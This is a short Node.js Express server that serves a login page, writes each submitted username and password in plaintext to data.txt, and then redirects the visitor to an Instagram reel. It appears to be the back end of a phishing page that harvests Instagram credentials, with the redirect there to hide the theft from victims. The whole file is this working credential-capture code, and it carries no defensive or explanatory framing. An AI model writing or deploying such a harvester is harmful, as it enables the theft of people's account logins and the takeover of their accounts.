const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, images)
app.use(express.static(path.join(__dirname, 'public')));

// Route to handle form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Append the submitted data to a file
    const data = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile('data.txt', data, (err) => {
        if (err) {
            console.error('Error saving data:', err);
            return res.status(500).send('Internal Server Error');
        }
        console.log('Data saved successfully.');
    });

    // Redirect to Instagram video
    res.redirect('https://www.instagram.com/reel/DDhgI3QyPzk/?igsh=em51aWI1dDZ6anc0');
});

// Default route to serve the login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
